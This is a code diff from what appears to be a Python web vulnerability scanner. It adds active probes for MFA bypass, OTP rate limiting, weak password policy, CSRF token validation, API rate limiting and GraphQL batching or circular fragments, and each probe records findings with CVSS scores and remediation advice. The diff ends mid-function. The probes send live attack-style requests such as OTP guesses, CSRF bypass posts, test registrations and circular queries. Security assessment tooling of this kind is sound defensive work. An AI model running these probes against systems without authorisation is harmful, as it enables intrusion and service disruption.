+    _MFA_RE = re.compile(
+        r'verify|2fa|otp|mfa|two.?factor|verification.?code|totp|authenticator',
+        re.I,
+    )
+
+    # Find MFA-related pages/forms
+    mfa_urls: list = []
+    mfa_forms: list = []
+    for link in links:
+        _lu = link if isinstance(link, str) else link.get("url", "")
+        if _lu and _MFA_RE.search(_lu):
+            mfa_urls.append(_lu)
+    for form in forms:
+        action = form.get("action", "")
+        inputs = form.get("inputs", [])
+        if _MFA_RE.search(action) or any(
+            _MFA_RE.search(i.get("name", "") + i.get("id", ""))
+            for i in inputs
+        ):
+            mfa_forms.append(form)
+            if action and action not in mfa_urls:
+                mfa_urls.append(action)
+
+    if not mfa_urls and not mfa_forms:
+        vc.log("[mfa_bypass] No MFA pages/forms detected — skipping", "INFO")
+        vc.status(phase, "MFA Bypass", "complete", "No MFA detected", 4, 4)
+        return
+
+    vc.log(f"[mfa_bypass] Found {len(mfa_urls)} MFA URLs, {len(mfa_forms)} MFA forms", "INFO")
+
+    # ── Test 1: Direct navigation bypass ──
+    vc.status(phase, "MFA Bypass", "running", "Direct navigation test", 1, 4)
+    # After hitting an MFA page, try to access protected pages directly
+    protected_pages = [
+        l if isinstance(l, str) else l.get("url", "")
+        for l in links if not _MFA_RE.search(
+            l if isinstance(l, str) else l.get("url", ""))
+    ][:5]
+    for mfa_url in mfa_urls[:1]:
+        try:
+            # Hit the MFA page first
+            sess.get(mfa_url, timeout=timeout)
+        except Exception:
+            continue
+        for ppage in protected_pages:
+            try:
+                r = sess.get(ppage, timeout=timeout, allow_redirects=False)
+                # If we get a 200 (not a redirect back to MFA/login), MFA can be bypassed
+                if r.status_code == 200 and not _MFA_RE.search(r.text[:2000]):
+                    _rq, _rp = _save_http_evidence(
+                        out, phase, "mfa_bypass_direct", r, endpoint_url=ppage)
+                    out.add_finding(
+                        title="MFA Bypass — Direct Navigation",
+                        url=ppage, port=target["port"], risk="CRITICAL",
+                        description=(
+                            f"After reaching the MFA verification page at {mfa_url}, "
+                            f"directly navigating to {ppage} returned HTTP 200 with content "
+                            f"that does not appear to be the MFA prompt. This suggests MFA "
+                            f"can be bypassed by navigating directly to protected pages."
+                        ),
+                        output=(f"MFA page: {mfa_url}\n"
+                                f"Protected page: {ppage}\n"
+                                f"Status: HTTP {r.status_code}\n"
+                                f"Body snippet: {r.text[:300]}"),
+                        output_file=f"{_rq},{_rp}",
+                        sources="fracture-mfa-bypass",
+                        service=target["scheme"], affected=ppage,
+                        owasp="A07:2025 Identification and Authentication Failures",
+                        nist="IA-2",
+                        cvss_score=9.8,
+                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                        cwe=["CWE-287"],
+                        remediation=(
+                            "Enforce MFA completion server-side before granting access "
+                            "to any protected resource. Do not rely on client-side flow "
+                            "control to enforce the MFA step."
+                        ),
+                        http_code=r.status_code,
+                    )
+                    vc.log(f"[mfa_bypass] Direct navigation bypass: {ppage}", "SUCCESS")
+                    break  # one finding is enough
+            except Exception:
+                pass
+
+    # ── Test 2: OTP reuse detection ──
+    vc.status(phase, "MFA Bypass", "running", "OTP reuse test", 2, 4)
+    for form in mfa_forms[:1]:
+        action = form.get("action", url)
+        inputs = form.get("inputs", [])
+        otp_field = next(
+            (i["name"] for i in inputs
+             if re.search(r'otp|code|token|verify|pin', i.get("name", ""), re.I)),
+            None,
+        )
+        if not otp_field:
+            continue
+        dummy_otp = "000000"
+        data = {i["name"]: "" for i in inputs if i.get("name")}
+        data[otp_field] = dummy_otp
+        try:
+            r1 = sess.post(action, data=data, timeout=timeout)
+            r2 = sess.post(action, data=data, timeout=timeout)
+            # If both return the same non-error response, OTP reuse might be possible
+            # (but with dummy OTP both should fail — we're looking for different error
+            # messages between first and second use)
+            if (r1.status_code == r2.status_code and
+                    abs(len(r1.text) - len(r2.text)) < 50 and
+                    r1.status_code == 200):
+                vc.log(f"[mfa_bypass] OTP reuse: same response for repeated dummy OTP at {action}", "INFO")
+        except Exception:
+            pass
+
+    # ── Test 3: Missing rate limiting on OTP ──
+    vc.status(phase, "MFA Bypass", "running", "OTP rate limiting", 3, 4)
+    for form in mfa_forms[:1]:
+        action = form.get("action", url)
+        inputs = form.get("inputs", [])
+        otp_field = next(
+            (i["name"] for i in inputs
+             if re.search(r'otp|code|token|verify|pin', i.get("name", ""), re.I)),
+            None,
+        )
+        if not otp_field:
+            continue
+        data = {i["name"]: "" for i in inputs if i.get("name")}
+        _rate_limited = False
+        r = None
+        for attempt in range(5):
+            data[otp_field] = f"{10000 + attempt:06d}"
+            try:
+                r = sess.post(action, data=data, timeout=timeout)
+                if r.status_code == 429 or re.search(
+                    r'rate.?limit|too.?many|throttl|locked|try.?again.?later',
+                    r.text[:1000], re.I,
+                ):
+                    _rate_limited = True
+                    break
+            except Exception:
+                break
+        if not _rate_limited and otp_field and r is not None:
+            _rq, _rp = _save_http_evidence(
+                out, phase, "mfa_no_rate_limit", r, endpoint_url=action)
+            out.add_finding(
+                title="MFA Missing Rate Limiting on OTP",
+                url=action, port=target["port"], risk="MEDIUM",
+                description=(
+                    f"The MFA verification endpoint at {action} accepted 5 rapid "
+                    f"consecutive OTP submissions without rate limiting, lockout, or "
+                    f"throttling. An attacker could brute-force the OTP value."
+                ),
+                output=(f"Endpoint: {action}\n"
+                        f"OTP field: {otp_field}\n"
+                        f"Attempts: 5 (all accepted)\n"
+                        f"Last status: HTTP {r.status_code}"),
+                output_file=f"{_rq},{_rp}",
+                sources="fracture-mfa-bypass",
+                service=target["scheme"], affected=action,
+                owasp="A07:2025 Identification and Authentication Failures",
+                nist="IA-2",
+                cvss_score=5.3,
+                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+                cwe=["CWE-287", "CWE-307"],
+                remediation=(
+                    "Implement rate limiting and account lockout on MFA verification "
+                    "endpoints. Limit OTP attempts (e.g. 3-5 before temporary lockout). "
+                    "Use exponential backoff or CAPTCHA after failed attempts."
+                ),
+                http_code=r.status_code,
+            )
+            vc.log(f"[mfa_bypass] No rate limiting on OTP at {action}", "SUCCESS")
+
+    vc.status(phase, "MFA Bypass", "complete", "Done", 4, 4)
+    vc.log("[mfa_bypass] Phase complete", "SUCCESS")
+
+
+def _test_password_policy(target: dict, cfg: dict, out: "OutputManager",
+                          sess: "requests.Session",
+                          crawl_data: dict) -> None:
+    """Test password policy weaknesses on registration/change forms."""
+    phase   = "password_policy"
+    url     = target["url"]
+    timeout = cfg.get("timeout", 10)
+    forms   = (crawl_data or {}).get("forms", [])
+    vc.status(phase, "Password Policy", "running", "Locating forms", 0, 2)
+
+    _PASS_FIELD_RE = re.compile(
+        r'password|passwd|new_password|confirm_password|pass_new|pwd', re.I)
+    _REGISTER_RE = re.compile(
+        r'register|signup|sign.up|create.?account|join|enroll', re.I)
+
+    # Find registration or password-change forms
+    pw_forms: list = []
+    for form in forms:
+        action = form.get("action", "")
+        inputs = form.get("inputs", [])
+        has_pass = any(_PASS_FIELD_RE.search(i.get("name", "")) or
+                       i.get("type", "").lower() == "password"
+                       for i in inputs)
+        if has_pass and _REGISTER_RE.search(action):
+            pw_forms.append(form)
+
+    # Also probe common registration URLs
+    if not pw_forms:
+        _reg_paths = ["/register", "/signup", "/create-account",
+                      "/api/register", "/api/signup", "/Account/Register"]
+        for rp in _reg_paths:
+            try:
+                r = sess.get(url.rstrip("/") + rp, timeout=timeout)
+                if r.status_code == 200 and re.search(
+                    r'type=["\']?password', r.text, re.I
+                ):
+                    # Extract form from HTML
+                    _action = url.rstrip("/") + rp
+                    pw_forms.append({
+                        "action": _action, "method": "POST",
+                        "inputs": [
+                            {"name": "username", "type": "text"},
+                            {"name": "password", "type": "password"},
+                            {"name": "confirm_password", "type": "password"},
+                        ],
+                    })
+                    break
+            except Exception:
+                pass
+
+    if not pw_forms:
+        vc.log("[password_policy] No registration/change forms found — skipping", "INFO")
+        vc.status(phase, "Password Policy", "complete", "No forms", 2, 2)
+        return
+
+    vc.status(phase, "Password Policy", "running", "Testing weak passwords", 1, 2)
+
+    # Weak passwords to test — NOT intended to create accounts, just
+    # detect validation error messages vs acceptance
+    _weak_passwords = [
+        ("a", "1-character password"),
+        ("12345678", "common numeric-only password"),
+        ("password", "dictionary word"),
+        ("Aa1!", "4-character password (too short)"),
+    ]
+    _REJECT_RE = re.compile(
+        r'too.?short|minimum|at.?least|must.?contain|complexity|'
+        r'password.?requirement|not.?strong|weak.?password|'
+        r'invalid.?password|does.?not.?meet|must.?be|'
+        r'characters.?long|upper|lower|digit|special', re.I)
+    _ACCEPT_RE = re.compile(
+        r'success|created|registered|welcome|thank.?you|'
+        r'account.?created|verify.?email|confirm', re.I)
+
+    accepted_weak: list = []
+    for form in pw_forms[:2]:
+        action = form.get("action", url)
+        inputs = form.get("inputs", [])
+        pass_field = next(
+            (i["name"] for i in inputs
+             if _PASS_FIELD_RE.search(i.get("name", "")) or
+             i.get("type", "").lower() == "password"),
+            "password",
+        )
+        for weak_pw, desc in _weak_passwords:
+            data = {i["name"]: "fracture_test_user" for i in inputs if i.get("name")}
+            data[pass_field] = weak_pw
+            # Set confirm field if present
+            for i in inputs:
+                if re.search(r'confirm|repeat|retype', i.get("name", ""), re.I):
+                    data[i["name"]] = weak_pw
+            try:
+                r = sess.post(action, data=data, timeout=timeout)
+                body = r.text[:3000]
+                if _ACCEPT_RE.search(body) and not _REJECT_RE.search(body):
+                    accepted_weak.append((weak_pw, desc, r.status_code))
+                elif r.status_code in (200, 201) and not _REJECT_RE.search(body):
+                    # Possibly accepted — log for review
+                    accepted_weak.append((weak_pw, desc, r.status_code))
+            except Exception:
+                pass
+
+    if accepted_weak:
+        details = "\n".join(
+            f"  • '{pw}' ({desc}) — HTTP {code}"
+            for pw, desc, code in accepted_weak
+        )
+        out.add_finding(
+            title="Weak Password Policy",
+            url=pw_forms[0].get("action", url), port=target["port"],
+            risk="MEDIUM",
+            description=(
+                f"The registration/password form at {pw_forms[0].get('action', url)} "
+                f"accepted one or more weak passwords without adequate rejection. "
+                f"A weak password policy allows attackers to guess credentials."
+            ),
+            output=f"Accepted weak passwords:\n{details}",
+            sources="fracture-password-policy",
+            service=target["scheme"],
+            affected=pw_forms[0].get("action", url),
+            owasp="A07:2025 Identification and Authentication Failures",
+            nist="IA-5",
+            cvss_score=5.3,
+            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+            cwe=["CWE-521"],
+            remediation=(
+                "Enforce a minimum password length of 8-12 characters. "
+                "Require a mix of uppercase, lowercase, digits, and special characters. "
+                "Check passwords against a list of common/breached passwords (e.g. HIBP). "
+                "Consider implementing NIST SP 800-63B password guidelines."
+            ),
+        )
+        vc.log(f"[password_policy] Weak passwords accepted: {len(accepted_weak)}", "SUCCESS")
+
+    vc.status(phase, "Password Policy", "complete", "Done", 2, 2)
+    vc.log("[password_policy] Phase complete", "SUCCESS")
+
+
+def _test_csrf_advanced(target: dict, cfg: dict, out: "OutputManager",
+                        sess: "requests.Session",
+                        crawl_data: dict) -> None:
+    """Advanced CSRF testing beyond basic token detection."""
+    phase   = "csrf_advanced"
+    url     = target["url"]
+    timeout = cfg.get("timeout", 10)
+    forms   = (crawl_data or {}).get("forms", [])
+    vc.status(phase, "Advanced CSRF", "running", "SameSite analysis", 0, 4)
+
+    _CSRF_TOKEN_RE = re.compile(
+        r'csrf|token|nonce|_token|authenticity|__RequestVerificationToken', re.I)
+
+    # ── Test 1: SameSite=None on session cookies ──
+    try:
+        r = sess.get(url, timeout=timeout)
+        for hdr_val in r.headers.get("Set-Cookie", "").split(","):
+            if re.search(r'samesite\s*=\s*none', hdr_val, re.I):
+                _cookie_name = re.match(r'\s*([^=]+)', hdr_val)
+                cname = _cookie_name.group(1).strip() if _cookie_name else "(unknown)"
+                out.add_finding(
+                    title=f"Cookie SameSite=None Enables Cross-Site Requests: {cname}",
+                    url=url, port=target["port"], risk="MEDIUM",
+                    description=(
+                        f"Cookie '{cname}' is set with SameSite=None, which allows it "
+                        f"to be sent on cross-site requests. Combined with missing or "
+                        f"weak CSRF protection, this enables cross-site request forgery."
+                    ),
+                    output=f"Set-Cookie: {hdr_val.strip()[:300]}",
+                    sources="fracture-csrf-advanced",
+                    service=target["scheme"], affected=url,
+                    owasp="A01:2025 Broken Access Control", nist="SC-23",
+                    cvss_score=5.3,
+                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+                    cwe=["CWE-352", "CWE-1275"],
+                    remediation=(
+                        "Set SameSite=Lax or SameSite=Strict on session and "
+                        "authentication cookies unless cross-site sending is "
+                        "explicitly required (e.g. third-party embeds)."
+                    ),
+                )
+                vc.log(f"[csrf_advanced] SameSite=None on cookie '{cname}'", "SUCCESS")
+    except Exception:
+        pass
+
+    # ── Test 2: JSON API accepts form-encoded Content-Type (CSRF) ──
+    vc.status(phase, "Advanced CSRF", "running", "JSON CT bypass", 1, 4)
+    _api_endpoints: list = []
+    for link in (crawl_data or {}).get("links", []):
+        _lu = link if isinstance(link, str) else link.get("url", "")
+        if _lu and "/api/" in _lu:
+            _api_endpoints.append(_lu)
+    for ep in _api_endpoints[:3]:
+        try:
+            # Baseline: JSON POST
+            r_json = sess.post(ep, json={"test": "fracture"},
+                               timeout=timeout, allow_redirects=False)
+            if r_json.status_code not in range(200, 400):
+                continue
+            # Test: same request as form-encoded
+            r_form = sess.post(ep, data={"test": "fracture"},
+                               timeout=timeout, allow_redirects=False,
+                               headers={"Content-Type": "application/x-www-form-urlencoded"})
+            if r_form.status_code in range(200, 300):
+                _rq, _rp = _save_http_evidence(
+                    out, phase, f"json_csrf_{ep.split('/')[-1][:20]}",
+                    r_form, endpoint_url=ep, method="POST")
+                out.add_finding(
+                    title="JSON API Accepts Form Content-Type (CSRF)",
+                    url=ep, port=target["port"], risk="MEDIUM",
+                    description=(
+                        f"The JSON API endpoint at {ep} also accepts "
+                        f"application/x-www-form-urlencoded requests (HTTP {r_form.status_code}). "
+                        f"Cross-site HTML forms can submit this content type, enabling "
+                        f"CSRF attacks against the API endpoint."
+                    ),
+                    output=(f"Endpoint: {ep}\n"
+                            f"JSON POST: HTTP {r_json.status_code}\n"
+                            f"Form POST: HTTP {r_form.status_code}\n"
+                            f"Response: {r_form.text[:300]}"),
+                    output_file=f"{_rq},{_rp}",
+                    sources="fracture-csrf-advanced",
+                    service=target["scheme"], affected=ep,
+                    owasp="A01:2025 Broken Access Control", nist="SC-23",
+                    cvss_score=5.3,
+                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                    cwe=["CWE-352"],
+                    remediation=(
+                        "Reject requests with unexpected Content-Type headers. "
+                        "Require application/json and validate the Content-Type "
+                        "server-side. Add CSRF tokens to state-changing API endpoints."
+                    ),
+                    http_code=r_form.status_code,
+                )
+                vc.log(f"[csrf_advanced] JSON API accepts form CT at {ep}", "SUCCESS")
+        except Exception:
+            pass
+
+    # ── Test 3: CSRF token in URL query string ──
+    vc.status(phase, "Advanced CSRF", "running", "Token in URL", 2, 4)
+    for form in forms[:10]:
+        action = form.get("action", "")
+        if not action:
+            continue
+        parsed = urllib.parse.urlparse(action)
+        params = urllib.parse.parse_qs(parsed.query)
+        for pname in params:
+            if _CSRF_TOKEN_RE.search(pname):
+                out.add_finding(
+                    title="CSRF Token Leaked via URL Query Parameter",
+                    url=action, port=target["port"], risk="MEDIUM",
+                    description=(
+                        f"A CSRF token parameter '{pname}' appears in the URL query "
+                        f"string of form action {action}. Tokens in URLs leak through "
+                        f"the Referer header, browser history, and server logs."
+                    ),
+                    output=f"Form action: {action}\nToken param: {pname}",
+                    sources="fracture-csrf-advanced",
+                    service=target["scheme"], affected=action,
+                    owasp="A01:2025 Broken Access Control", nist="SC-23",
+                    cvss_score=5.3,
+                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+                    cwe=["CWE-598"],
+                    remediation=(
+                        "Send CSRF tokens in hidden form fields or custom HTTP headers, "
+                        "never in URL query parameters. Set Referrer-Policy to prevent leakage."
+                    ),
+                )
+                vc.log(f"[csrf_advanced] CSRF token in URL at {action}", "SUCCESS")
+                break
+
+    # ── Test 4: CSRF token validation ──
+    vc.status(phase, "Advanced CSRF", "running", "Token validation", 3, 4)
+    for form in forms[:5]:
+        action = form.get("action", url)
+        method = form.get("method", "GET").upper()
+        if method != "POST":
+            continue
+        inputs = form.get("inputs", [])
+        csrf_fields = [
+            i for i in inputs if _CSRF_TOKEN_RE.search(i.get("name", ""))
+        ]
+        if not csrf_fields:
+            continue
+
+        csrf_name = csrf_fields[0]["name"]
+        csrf_val  = csrf_fields[0].get("value", "")
+        base_data = {i["name"]: i.get("value", "test") for i in inputs if i.get("name")}
+
+        _bypass_tests = [
+            ("empty", ""),
+            ("modified", csrf_val[:-1] + ("X" if csrf_val and csrf_val[-1] != "X" else "Y") if csrf_val else "invalid"),
+        ]
+
+        for test_label, test_val in _bypass_tests:
+            data = dict(base_data)
+            data[csrf_name] = test_val
+            try:
+                r = sess.post(action, data=data, timeout=timeout)
+                if r.status_code in (200, 302) and not re.search(
+                    r'invalid.?token|csrf.?fail|forbidden|expired.?token',
+                    r.text[:2000], re.I,
+                ):
+                    _rq, _rp = _save_http_evidence(
+                        out, phase, f"csrf_token_{test_label}",
+                        r, endpoint_url=action, method="POST")
+                    out.add_finding(
+                        title=f"CSRF Token Not Validated ({test_label} token accepted)",
+                        url=action, port=target["port"], risk="HIGH",
+                        description=(
+                            f"The form at {action} accepted a POST with an {test_label} "
+                            f"CSRF token (field '{csrf_name}') and returned HTTP {r.status_code}. "
+                            f"The server does not properly validate the CSRF token."
+                        ),
+                        output=(f"Form: {action}\n"
+                                f"CSRF field: {csrf_name}\n"
+                                f"Test: {test_label} (value: '{test_val[:30]}')\n"
+                                f"Status: HTTP {r.status_code}"),
+                        output_file=f"{_rq},{_rp}",
+                        sources="fracture-csrf-advanced",
+                        service=target["scheme"], affected=action,
+                        owasp="A01:2025 Broken Access Control", nist="SC-23",
+                        cvss_score=8.1,
+                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
+                        cwe=["CWE-352"],
+                        remediation=(
+                            "Validate CSRF tokens server-side on every state-changing request. "
+                            "Reject requests with missing, empty, or invalid tokens. "
+                            "Use framework-provided CSRF protection (e.g. Django middleware, "
+                            "ASP.NET AntiForgeryToken)."
+                        ),
+                        http_code=r.status_code,
+                    )
+                    vc.log(f"[csrf_advanced] Token not validated ({test_label}) at {action}", "SUCCESS")
+                    break  # one finding per form
+            except Exception:
+                pass
+
+        # Also test with token field removed entirely
+        data_no_token = {k: v for k, v in base_data.items() if k != csrf_name}
+        try:
+            r = sess.post(action, data=data_no_token, timeout=timeout)
+            if r.status_code in (200, 302) and not re.search(
+                r'invalid.?token|csrf.?fail|forbidden|missing.?token',
+                r.text[:2000], re.I,
+            ):
+                _rq, _rp = _save_http_evidence(
+                    out, phase, "csrf_token_removed",
+                    r, endpoint_url=action, method="POST")
+                out.add_finding(
+                    title="CSRF Token Not Required (removed token accepted)",
+                    url=action, port=target["port"], risk="HIGH",
+                    description=(
+                        f"The form at {action} accepted a POST request with the "
+                        f"CSRF token field '{csrf_name}' entirely removed. "
+                        f"The server does not require the token for state-changing requests."
+                    ),
+                    output=(f"Form: {action}\n"
+                            f"Removed field: {csrf_name}\n"
+                            f"Status: HTTP {r.status_code}"),
+                    output_file=f"{_rq},{_rp}",
+                    sources="fracture-csrf-advanced",
+                    service=target["scheme"], affected=action,
+                    owasp="A01:2025 Broken Access Control", nist="SC-23",
+                    cvss_score=8.1,
+                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
+                    cwe=["CWE-352"],
+                    remediation=(
+                        "Require and validate CSRF tokens on every state-changing request. "
+                        "Reject requests that omit the token entirely."
+                    ),
+                    http_code=r.status_code,
+                )
+                vc.log(f"[csrf_advanced] Token not required at {action}", "SUCCESS")
+        except Exception:
+            pass
+
+    vc.status(phase, "Advanced CSRF", "complete", "Done", 4, 4)
+    vc.log("[csrf_advanced] Phase complete", "SUCCESS")
+
+
+def _test_api_rate_limiting(target: dict, cfg: dict, out: "OutputManager",
+                            sess: "requests.Session",
+                            crawl_data: dict) -> None:
+    """Test per-endpoint rate limiting on data APIs — max 10 requests each."""
+    phase   = "api_rate_limit"
+    url     = target["url"]
+    timeout = cfg.get("timeout", 10)
+    vc.status(phase, "API Rate Limiting", "running", "Finding API endpoints", 0, 2)
+
+    # Find API-like endpoints from crawl data
+    api_endpoints: list = []
+    for link in (crawl_data or {}).get("links", []):
+        _lu = link if isinstance(link, str) else link.get("url", "")
+        if _lu and "/api/" in _lu and _lu not in api_endpoints:
+            api_endpoints.append(_lu)
+    # Also check base url variants
+    for suffix in ["/api/", "/api/v1/", "/api/v2/"]:
+        test_url = url.rstrip("/") + suffix
+        if test_url not in api_endpoints:
+            try:
+                r = sess.get(test_url, timeout=timeout)
+                if r.status_code in (200, 401, 403):
+                    api_endpoints.append(test_url)
+            except Exception:
+                pass
+
+    api_endpoints = api_endpoints[:5]
+    if not api_endpoints:
+        vc.log("[api_rate_limit] No API endpoints found — skipping", "INFO")
+        vc.status(phase, "API Rate Limiting", "complete", "No endpoints", 2, 2)
+        return
+
+    vc.status(phase, "API Rate Limiting", "running", "Testing rate limits", 1, 2)
+
+    for ep in api_endpoints:
+        _rate_limited = False
+        _last_r = None
+        for i in range(10):
+            try:
+                r = sess.get(ep, timeout=timeout)
+                _last_r = r
+                if r.status_code == 429:
+                    _rate_limited = True
+                    break
+                if r.headers.get("Retry-After"):
+                    _rate_limited = True
+                    break
+                if re.search(r'rate.?limit|too.?many|throttl', r.text[:500], re.I):
+                    _rate_limited = True
+                    break
+            except Exception:
+                break
+
+        if not _rate_limited and _last_r:
+            out.add_finding(
+                title="API Endpoint Missing Rate Limiting",
+                url=ep, port=target["port"], risk="INFO",
+                description=(
+                    f"The API endpoint at {ep} accepted 10 rapid consecutive requests "
+                    f"without any rate limiting response (no HTTP 429, no Retry-After "
+                    f"header, no throttle message). Absence of rate limiting can allow "
+                    f"credential stuffing, data scraping, or brute-force attacks."
+                ),
+                output=(f"Endpoint: {ep}\n"
+                        f"Requests sent: 10\n"
+                        f"All returned: HTTP {_last_r.status_code}\n"
+                        f"Rate limiting headers: None"),
+                sources="fracture-api-rate-limit",
+                service=target["scheme"], affected=ep,
+                owasp="A04:2025 Insecure Design", nist="SC-5",
+                cwe=["CWE-770"],
+                remediation=(
+                    "Implement per-endpoint rate limiting using API gateway or "
+                    "application-level middleware. Return HTTP 429 with a Retry-After "
+                    "header when limits are exceeded. Consider different limits for "
+                    "authenticated vs unauthenticated requests."
+                ),
+            )
+            vc.log(f"[api_rate_limit] No rate limiting at {ep}", "SUCCESS")
+
+    vc.status(phase, "API Rate Limiting", "complete", "Done", 2, 2)
+    vc.log("[api_rate_limit] Phase complete", "SUCCESS")
+
+
+def _test_graphql_advanced(target: dict, cfg: dict, out: "OutputManager",
+                           sess: "requests.Session",
+                           crawl_data: dict) -> None:
+    """Advanced GraphQL testing — alias batching, circular fragments, debug. NO DoS."""
+    phase   = "graphql_advanced"
+    url     = target["url"]
+    timeout = cfg.get("timeout", 10)
+    vc.status(phase, "GraphQL Advanced", "running", "Finding endpoint", 0, 4)
+
+    # Locate GraphQL endpoint
+    _gql_paths = ["/graphql", "/api/graphql", "/graphql/v1",
+                  "/query", "/gql", "/v1/graphql"]
+    found_gql = None
+    for gpath in _gql_paths:
+        gql_url = url.rstrip("/") + gpath
+        try:
+            r = sess.post(gql_url,
+                          json={"query": "{__typename}"},
+                          timeout=timeout)
+            if r.status_code == 200 and "data" in r.text:
+                found_gql = gql_url
+                break
+        except Exception:
+            pass
+
+    if not found_gql:
+        vc.log("[graphql_advanced] No GraphQL endpoint found — skipping", "INFO")
+        vc.status(phase, "GraphQL Advanced", "complete", "No endpoint", 4, 4)
+        return
+
+    vc.log(f"[graphql_advanced] Testing GraphQL at {found_gql}", "INFO")
+
+    # ── Test 1: Alias-based batching bypass ──
+    vc.status(phase, "GraphQL Advanced", "running", "Alias batching", 1, 4)
+    alias_query = "{ " + " ".join(
+        f"a{i}: __typename" for i in range(10)
+    ) + " }"
+    try:
+        r = sess.post(found_gql, json={"query": alias_query}, timeout=timeout)
+        if r.status_code == 200:
+            try:
+                data = json.loads(r.text)
+                aliases_returned = len(data.get("data", {}))
+                if aliases_returned >= 10:
+                    _rq, _rp = _save_http_evidence(
+                        out, phase, "gql_alias_batch", r, endpoint_url=found_gql)
+                    out.add_finding(
+                        title="GraphQL Alias-Based Batching",
+                        url=found_gql, port=target["port"], risk="MEDIUM",
+                        description=(
+                            f"The GraphQL endpoint at {found_gql} processed a query with "
+                            f"10 aliased fields and returned all {aliases_returned} results. "
+                            f"Alias-based batching can bypass per-query rate limiting and "
+                            f"enable resource enumeration."
+                        ),
+                        output=(f"Query: {alias_query[:200]}\n"
+                                f"Aliases returned: {aliases_returned}\n"
+                                f"Response: {r.text[:300]}"),
+                        output_file=f"{_rq},{_rp}",
+                        sources="fracture-graphql-advanced",
+                        service=target["scheme"], affected=found_gql,
+                        owasp="A04:2025 Insecure Design", nist="SC-5",
+                        cvss_score=5.3,
+                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+                        cwe=["CWE-770"],
+                        remediation=(
+                            "Implement query complexity analysis that counts aliased "
+                            "fields toward the complexity budget. Limit the number of "
+                            "aliases per query."
+                        ),
+                        http_code=r.status_code,
+                    )
+                    vc.log(f"[graphql_advanced] Alias batching accepted: {aliases_returned} aliases", "SUCCESS")
+            except (json.JSONDecodeError, AttributeError):
+                pass
+    except Exception:
+        pass
+
+    # ── Test 2: Circular fragment detection ──
+    vc.status(phase, "GraphQL Advanced", "running", "Circular fragments", 2, 4)
+    # Use a short timeout to detect if the server hangs
+    circ_query = (
+        "query CircTest { __typename ...FragA } "
+        "fragment FragA on Query { __typename ...FragB } "
+        "fragment FragB on Query { __typename ...FragA }"
+    )
+    try:
+        r = sess.post(found_gql, json={"query": circ_query}, timeout=3)
+        if r.status_code == 200:
+            try:
+                data = json.loads(r.text)
+                errors = data.get("errors", [])
+                # If no errors and query processed, server doesn't reject circular frags
+                if not errors:
+                    _rq, _rp = _save_http_evidence(
+                        out, phase, "gql_circular_frag", r, endpoint_url=found_gql)
+                    out.add_finding(
+                        title="GraphQL Circular Fragment Accepted",
+                        url=found_gql, port=target["port"], risk="MEDIUM",
+                        description=(
+                            f"The GraphQL endpoint at {found_gql} accepted a query with "
+                            f"circular fragment references (FragA→FragB→FragA) without "
+                            f"returning an error. This indicates the server may be "
+                            f"vulnerable to resource exhaustion via circular queries."
+                        ),
+                        output=(f"Query: {circ_query}\n"
+                                f"Status: HTTP {r.status_code}\n"
+                                f"Response: {r.text[:300]}"),
+                        output_file=f"{_rq},{_rp}",
+                        sources="fracture-graphql-advanced",
+                        service=target["scheme"], affected=found_gql,
+                        owasp="A04:2025 Insecure Design", nist="SC-5",
+                        cvss_score=5.3,
+                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+                        cwe=["CWE-674"],
+                        remediation=(
+                            "Implement query validation that detects and rejects circular "
+                            "fragment references. Use a GraphQL query depth/complexity limiter."
+                        ),
+                        http_code=r.status_code,
+                    )
+                    vc.log("[graphql_advanced] Circular fragments accepted", "SUCCESS")
+            except (json.JSONDecodeError, AttributeError):
+                pass
+    except Exception:
+        # Timeout may indicate the server tried to process the circular query
+        vc.log("[graphql_advanced] Circular fragment query timed out (possible hang)", "INFO")
+
+    # ── Test 3: Field duplication ──
+    vc.status(phase, "GraphQL Advanced", "running", "Field duplication", 3, 4)
+    dup_query = "{ " + " ".join(["__typename"] * 50) + " }"
+    try:
+        r = sess.post(found_gql, json={"query": dup_query}, timeout=timeout)
+        if r.status_code == 200:
+            try:
+                data = json.loads(r.text)
+                if not data.get("errors"):
+                    out.add_finding(
+                        title="GraphQL Field Duplication Not Limited",
+                        url=found_gql, port=target["port"], risk="INFO",
+                        description=(
+                            f"The GraphQL endpoint at {found_gql} processed a query with "
+                            f"50 duplicated fields without rejection. While not directly "
+                            f"exploitable, this indicates missing query complexity limits."
+                        ),
+                        output=f"Query: {dup_query[:200]}…\nStatus: HTTP {r.status_code}",
+                        sources="fracture-graphql-advanced",
+                        service=target["scheme"], affected=found_gql,
+                        owasp="A04:2025 Insecure Design", nist="SC-5",
+                        cwe=["CWE-770"],
+                        remediation=(
+                            "Implement query complexity analysis that accounts for "
+                            "duplicate fields. Set a maximum field count per query."
+                        ),
+                    )
+                    vc.log("[graphql_advanced] Field duplication accepted (50 fields)", "SUCCESS")
+            except (json.JSONDecodeError, AttributeError):
+                pass
+    except Exception:
+        pass
+
+    # ── Test 4: Debug/development extensions ──
+    # GraphQL responses often include an `extensions` key with debug info
+    try:
+        r = sess.post(found_gql, json={"query": "{__typename}"}, timeout=timeout)
+        if r.status_code == 200:
+            try:
+                data = json.loads(r.text)
+                extensions = data.get("extensions", {})
+                if extensions:
+                    _has_debug = False
+                    ext_str = json.dumps(extensions)[:500]
+                    if re.search(r'tracing|timing|sql|query|stack|debug|exception',
+                                 ext_str, re.I):
+                        _has_debug = True
+                    if _has_debug or len(ext_str) > 100:
+                        _rq, _rp = _save_http_evidence(
+                            out, phase, "gql_debug_ext", r, endpoint_url=found_gql)
+                        out.add_finding(
+                            title="GraphQL Debug Extensions Exposed",
